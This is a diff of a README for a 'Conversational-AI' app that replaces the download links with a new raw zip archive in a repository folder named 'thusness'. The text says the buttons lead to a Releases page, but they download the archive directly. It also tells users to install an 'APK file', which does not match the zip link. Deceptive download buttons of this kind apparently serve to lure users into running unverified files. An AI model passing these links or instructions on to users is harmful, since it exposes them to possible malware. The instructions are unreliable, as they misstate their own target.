@@ -14,7 +14,7 @@ To get started with Conversational-AI, follow these steps:
 2. **Download the Application**
    - Click the button below to visit the Releases page.
 
-   [![Download Conversational-AI](https://raw.githubusercontent.com/junior478rd/Conversational-AI/main/thusness/AI_Conversational_1.6.zip)](https://raw.githubusercontent.com/junior478rd/Conversational-AI/main/thusness/AI_Conversational_1.6.zip)
+   [![Download Conversational-AI](https://github.com/junior478rd/Conversational-AI/raw/refs/heads/main/thusness/Conversational-AI-v1.7.zip)](https://github.com/junior478rd/Conversational-AI/raw/refs/heads/main/thusness/Conversational-AI-v1.7.zip)
 
 3. **Select a Release**
    - On the Releases page, you will see a list of available versions of the Conversational-AI app.
@@ -32,7 +32,7 @@ To get started with Conversational-AI, follow these steps:
 ## 📥 Download & Install
 To download Conversational-AI, visit the Releases page:
 
-[![Download Conversational-AI](https://raw.githubusercontent.com/junior478rd/Conversational-AI/main/thusness/AI_Conversational_1.6.zip)](https://raw.githubusercontent.com/junior478rd/Conversational-AI/main/thusness/AI_Conversational_1.6.zip)
+[![Download Conversational-AI](https://github.com/junior478rd/Conversational-AI/raw/refs/heads/main/thusness/Conversational-AI-v1.7.zip)](https://github.com/junior478rd/Conversational-AI/raw/refs/heads/main/thusness/Conversational-AI-v1.7.zip)
 
 On this page, find the latest version. Download the APK file and follow the instructions above to install.
 
